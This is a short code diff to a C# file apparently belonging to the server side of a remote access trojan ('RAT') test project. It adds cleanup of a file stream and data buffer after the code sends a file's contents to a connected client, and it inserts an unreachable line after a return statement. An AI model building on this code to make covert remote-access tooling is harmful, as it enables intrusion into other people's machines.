@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Data;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
@@ -72,9 +73,13 @@ namespace RAT_test_serverside
 
                         string dataString = string.Join("+", data);
                         Console.WriteLine("Sending File: " + sendArgs[1]);
-                        string test = "S " + sendArgs[1] + " " + dataString;
                         sw.WriteLine("S_" + sendArgs[1] + "_" + dataString);
                         sw.Flush();
+
+                        //Dispose everything
+                        fs.Dispose();
+                        dataString = String.Empty;
+                        Array.Clear(data,0,data.Length);
                     }
 
                     //Get data
@@ -102,6 +107,7 @@ namespace RAT_test_serverside
             {
                 inputStream.CopyTo(ms);
                 return ms.ToArray();
+                ms.SetLength(0);
             }
         }
 
